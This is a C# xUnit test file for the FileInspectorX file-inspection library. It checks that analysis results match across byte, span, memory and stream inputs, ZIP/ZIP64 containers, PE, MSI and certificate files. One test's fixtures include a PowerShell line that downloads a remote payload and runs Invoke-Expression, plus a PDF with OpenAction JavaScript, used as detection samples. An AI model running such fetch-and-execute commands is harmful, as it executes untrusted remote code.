using System.Security.Cryptography;
using System.Text;
using Xunit;

namespace FileInspectorX.Tests;

[Collection(nameof(ArchiveBudgetSettingsCollection))]
public sealed partial class PortableAnalysisTests
{
    private static FileInspector.DetectionOptions Options() => new()
    {
        IncludePermissions = false, IncludeShellProperties = false, IncludeInstaller = false,
        IncludeAuthenticode = false, IncludeAssessment = true, IncludeReferences = true,
        ComputeSha256 = true, CollectMetrics = true,
        Settings = InspectionSettings.CaptureDefaults() with {
            DeepContainerScanEnabled = true, DeepContainerMaxEntries = 16, DeepContainerMaxEntryBytes = 4096
        }
    };

    [Theory]
    [MemberData(nameof(InspectionIntegrityTests.ZipSubtypeCorpus), MemberType = typeof(InspectionIntegrityTests))]
    public void ClassicAndZip64AnalysisRetainsCompleteContentAcrossAdapters(string marker, string extension, string? guess, string content, bool zip64)
    {
        var entries = new List<(string Name, string Content)> { ("padding.bin", new string('x', 32 * 1024)) };
        if (guess == null) entries.Add(("[Content_Types].xml", "<Types />"));
        entries.Add((marker, content));
        var bytes = ZipTestArchive.Create(entries.ToArray());
        if (zip64) bytes = ZipTestArchive.WithZip64Footer(bytes);
        foreach (var result in InspectShapes(bytes, "upload.zip", Options()))
        {
            Assert.Equal(extension, result.Detection!.Extension);
            Assert.Equal(guess, result.GuessedExtension);
            Assert.Equal(entries.Count, result.ContainerEntryCount);
            Assert.Equal(Hash(bytes), result.Detection.Sha256Hex);
            // The operation includes hashes requested by nested child inspections.
            Assert.True(result.Metrics!.HashBytes >= bytes.Length);
        }
    }

    [Theory]
    [InlineData("upload.ps1", "#!/usr/bin/env pwsh\nInvoke-WebRequest https://example.invalid/payload.ps1\nInvoke-Expression $value")]
    [InlineData("upload.html", "<!doctype html><html><script src='https://example.invalid/a.js'></script><a href='https://example.invalid/'>link</a></html>")]
    [InlineData("upload.pdf", "%PDF-1.4\n1 0 obj <</Type /Catalog /OpenAction 2 0 R /JavaScript (evil) /EmbeddedFiles []>> endobj\n%%EOF")]
    [InlineData("upload.json", "{\"name\":\"sample\",\"nested\":{\"value\":1}}")]
    public void SharedContentAnalysisMatchesPathFacts(string name, string content)
    {
        var bytes = Encoding.UTF8.GetBytes(content);
        string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + Path.GetExtension(name));
        try
        {
            File.WriteAllBytes(path, bytes);
            var baseline = FileInspector.Analyze(path, Options());
            foreach (var result in InspectShapes(bytes, name, Options()))
            {
                Assert.Equal(baseline.Detection!.Extension, result.Detection!.Extension);
                Assert.Equal(baseline.Detection.ValidationStatus, result.Detection.ValidationStatus);
                Assert.Equal(baseline.Flags, result.Flags);
                Assert.Equal(baseline.TextSubtype, result.TextSubtype);
                Assert.Equal(baseline.ScriptLanguage, result.ScriptLanguage);
                Assert.Equal(baseline.AnalysisComplete, result.AnalysisComplete);
                Assert.Equal(baseline.References?.Select(r => (r.Kind, r.SourceTag, r.Value, r.Issues)),
                    result.References?.Select(r => (r.Kind, r.SourceTag, r.Value, r.Issues)));
                Assert.Equal(Hash(bytes), result.Detection.Sha256Hex);
            }
        }
        finally { TestHelpers.SafeDelete(path); }
    }

    [Fact]
    public void ManagedPeFactsAndVersionStringsComeFromContent()
    {
        var bytes = File.ReadAllBytes(typeof(FileInspector).Assembly.Location);
        var baseline = FileInspector.Analyze(typeof(FileInspector).Assembly.Location, Options());
        foreach (var result in InspectShapes(bytes, "upload.dll", Options()))
        {
            Assert.Equal(baseline.PeMachine, result.PeMachine);
            Assert.Equal(baseline.PeKind, result.PeKind);
            Assert.Equal(baseline.PeSubsystem, result.PeSubsystem);
            Assert.Equal(baseline.Flags, result.Flags);
            Assert.Equal(baseline.VersionInfo?.OrderBy(kv => kv.Key), result.VersionInfo?.OrderBy(kv => kv.Key));
            Assert.Equal(Hash(bytes), result.Detection!.Sha256Hex);
        }
    }

    [Fact]
    public void NameHintCannotOpenAnExistingFileAndMissingPathStagesStayExplicit()
    {
        var bytes = Encoding.UTF8.GetBytes("{\"value\":1}");
        string path = Path.GetTempFileName();
        try
        {
            File.WriteAllText(path, "filesystem-only-marker");
            var options = Options();
            options.IncludePermissions = true;
            options.IncludeShellProperties = true;
            var result = FileInspector.Analyze(bytes, options, path);
            Assert.Equal(Hash(bytes), result.Detection!.Sha256Hex);
            Assert.Null(result.Security);
            Assert.Null(result.ShellProperties);
            Assert.False(result.AnalysisComplete);
            Assert.Equal(InspectionOutcome.Partial, result.Outcome);
            Assert.Equal(InspectionStageStatus.Unavailable, Stage(result, InspectionStage.Permissions).Status);
            Assert.Equal(InspectionStageStatus.Unavailable, Stage(result, InspectionStage.ShellProperties).Status);
            Assert.Contains("permissions:path-required", result.AnalysisIssues!);
            Assert.Equal(result.StageOutcomes, ReportView.From(result).StageOutcomes);
        }
        finally { TestHelpers.SafeDelete(path); }
    }

    [Fact]
    public void DeclaredMsiRetainsUnavailableNativeInstallerOutcome()
    {
        var bytes = new byte[12000];
        new byte[] { 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1 }.CopyTo(bytes, 0);
        bytes[0x1A] = 3; bytes[0x1C] = 0xFE; bytes[0x1D] = 0xFF;
        bytes[0x1E] = 9; bytes[0x20] = 6; bytes[0x2C] = 1;
        var options = Options();
        options.IncludeInstaller = true;
        var result = FileInspector.Analyze(bytes, options, "upload.msi");
        Assert.Equal("msi", result.Detection!.Extension);
        Assert.Null(result.Installer);
        Assert.Equal(InspectionStageStatus.Unavailable, Stage(result, InspectionStage.Installer).Status);
        Assert.Contains("installer:path-required", result.AnalysisIssues!);
    }

    [Fact]
    public void ForwardOnlyInputSupportsDetectionOnlyAndRejectsFullAnalysisBeforeReading()
    {
        var bytes = Encoding.UTF8.GetBytes("{\"value\":1}");
        using var stream = new FragmentedInput(bytes, seekable: false);
        Assert.Throws<NotSupportedException>(() => FileInspector.Analyze(stream, Options()));
        Assert.Equal(0, stream.BytesRead);
        var options = Options(); options.DetectOnly = true;
        var result = FileInspector.Inspect(stream, options);
        Assert.Equal("json", result.Detection!.Extension);
        Assert.Equal(Hash(bytes), result.Detection.Sha256Hex);
        Assert.Equal(bytes.Length, stream.BytesRead);
        Assert.False(stream.Disposed);
        Assert.Equal(InspectionStageStatus.NotRequested, Stage(result, InspectionStage.Permissions).Status);
    }

    [Fact]
    public void InFlightCancellationRestoresBorrowedPositionAndOperationState()
    {
        var bytes = Encoding.UTF8.GetBytes("{\"value\":\"" + new string('x', 10000) + "\"}");
        using var cancel = new CancellationTokenSource();
        using var stream = new FragmentedInput(bytes) { OnRead = () => cancel.Cancel() };
        stream.Position = 7;
        var options = Options(); options.CancellationToken = cancel.Token;
        Assert.Throws<OperationCanceledException>(() => FileInspector.Analyze(stream, options));
        Assert.Equal(7, stream.Position);
        Assert.False(stream.Disposed);
        Assert.Null(InspectionOperation.Current);
        Assert.Equal(InspectionOutcome.Complete, FileInspector.Analyze(Encoding.UTF8.GetBytes("{}"), Options()).Outcome);
    }

    [Fact]
    public void EmptyReadableInputHasNoInventedFormatOrFilesystemEvidence()
    {
        var result = FileInspector.Analyze(Array.Empty<byte>(), Options());
        Assert.Equal(InspectionInputStatus.Unrecognized, result.InputStatus);
        Assert.Equal(InspectionOutcome.Complete, result.Outcome);
        Assert.True(result.AnalysisComplete);
        Assert.Equal(Hash(Array.Empty<byte>()), result.Detection!.Sha256Hex);
        Assert.Null(result.Security);
        Assert.Equal(0, result.Metrics!.HashBytes);
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void UnreadableBorrowedInputRetainsFailureMetricsAndRequiredProviderContract(bool detectionOnly)
    {
        using var stream = new FragmentedInput(Encoding.UTF8.GetBytes("{}")) { ReadFailure = new IOException("fixture") };
        stream.Position = 1;
        var options = Options(); options.DetectOnly = detectionOnly;
        var result = FileInspector.Inspect(stream, options);
        Assert.Equal(InspectionOutcome.InputUnavailable, result.Outcome);
        Assert.NotNull(result.Metrics);
        Assert.Equal(1, stream.Position);
        Assert.False(stream.Disposed);
        options.LearnedClassificationMode = LearnedClassificationMode.Required;
        options.LearnedClassifier = new UnexpectedClassifier();
        var error = Assert.Throws<LearnedClassificationException>(() => FileInspector.Inspect(stream, options));
        Assert.IsType<IOException>(error.InnerException);
        Assert.Equal(1, stream.Position);
        Assert.Null(InspectionOperation.Current);
    }

    [Fact]
    public void StackSpanAnalysisFinishesBeforeTheBorrowedContentChanges()
    {
        var bytes = Encoding.UTF8.GetBytes("{\"value\":1}");
        Span<byte> content = stackalloc byte[128];
        bytes.AsSpan().CopyTo(content);
        var result = FileInspector.Analyze(content.Slice(0, bytes.Length), Options(), "upload.json");
        content.Clear();
        Assert.Equal("json", result.Detection!.Extension);
        Assert.Equal(Hash(bytes), result.Detection.Sha256Hex);
        Assert.Equal(InspectionOutcome.Complete, result.Outcome);
    }

    private sealed class UnexpectedClassifier : ILearnedContentClassifier
    {
        public LearnedContentPrediction Predict(ReadOnlyMemory<byte> content) => throw new InvalidOperationException("Input failed before classification.");
        public LearnedContentPrediction Predict(Stream content) => throw new InvalidOperationException("Input failed before classification.");
    }

#if NET8_0_OR_GREATER
    [Fact]
    public void CompleteCertificateCanExceedTheHeaderSampleWithinTheReadBudget()
    {
        using var rsa = RSA.Create(2048);
        var request = new System.Security.Cryptography.X509Certificates.CertificateRequest("CN=Portable fixture", rsa,
            HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
        using var certificate = request.CreateSelfSigned(new DateTimeOffset(2020, 1, 1, 0, 0, 0, TimeSpan.Zero),
            new DateTimeOffset(2035, 1, 1, 0, 0, 0, TimeSpan.Zero));
        var options = Options();
        options.Settings = options.Settings! with { HeaderReadBytes = 256 };
        foreach (var result in InspectShapes(certificate.RawData, "upload.cer", options))
        {
            Assert.NotNull(result.Certificate);
            Assert.Equal(certificate.Thumbprint, result.Certificate!.Thumbprint);
        }
        string path = Path.GetTempFileName();
        try
        {
            File.WriteAllBytes(path, certificate.RawData);
            Assert.Equal(certificate.Thumbprint, FileInspector.Analyze(path, options).Certificate!.Thumbprint);
        }
        finally { TestHelpers.SafeDelete(path); }
    }
#endif

    private static InspectionStageResult Stage(FileAnalysis result, InspectionStage stage)
        => Assert.Single(result.StageOutcomes, value => value.Stage == stage);

    private static string Hash(byte[] bytes)
    { using var sha = SHA256.Create(); return BitConverter.ToString(sha.ComputeHash(bytes)).Replace("-", "").ToLowerInvariant(); }

    private static IEnumerable<FileAnalysis> InspectShapes(byte[] bytes, string name, FileInspector.DetectionOptions options)
    {
        var framed = new byte[bytes.Length + 19];
        Buffer.BlockCopy(bytes, 0, framed, 11, bytes.Length);
        yield return FileInspector.Analyze(bytes, options, name);
        yield return FileInspector.Inspect(framed.AsMemory(11, bytes.Length), options, name);
        yield return FileInspector.Analyze(framed.AsSpan(11, bytes.Length), options, name);
        using var input = new FragmentedInput(bytes); input.Position = 7;
        var result = FileInspector.Inspect(input, options, name);
        Assert.Equal(7, input.Position);
        Assert.False(input.Disposed);
        if (result.ContainerEntryCount.HasValue)
        {
            Assert.True(result.Metrics!.StreamBytesRead >= input.BytesRead);
            Assert.True(result.Metrics.ReadOperations >= input.ReadCalls);
        }
        else
        {
            Assert.Equal(input.BytesRead, result.Metrics!.StreamBytesRead);
            Assert.Equal(input.ReadCalls, result.Metrics.ReadOperations);
        }
        yield return result;
    }

    private sealed class FragmentedInput : Stream
    {
        private readonly MemoryStream _inner;
        private readonly bool _seekable;
        internal long BytesRead, ReadCalls;
        internal bool Disposed;
        internal Action? OnRead;
        internal IOException? ReadFailure;
        internal FragmentedInput(byte[] bytes, bool seekable = true) { _inner = new(bytes); _seekable = seekable; }
        public override bool CanRead => !Disposed;
        public override bool CanSeek => _seekable;
        public override bool CanWrite => false;
        public override long Length => _seekable ? _inner.Length : throw new NotSupportedException();
        public override long Position { get => _inner.Position; set => _inner.Position = value; }
        public override long Seek(long offset, SeekOrigin origin) => _seekable ? _inner.Seek(offset, origin) : throw new NotSupportedException();
        public override int Read(byte[] buffer, int offset, int count)
        { if (ReadFailure != null) throw ReadFailure; int read = _inner.Read(buffer, offset, Math.Min(3, count)); BytesRead += read; ReadCalls++; OnRead?.Invoke(); return read; }
        protected override void Dispose(bool disposing) { Disposed = true; if (disposing) _inner.Dispose(); base.Dispose(disposing); }
        public override void Flush() { }
        public override void SetLength(long value) => throw new NotSupportedException();
        public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
    }
}
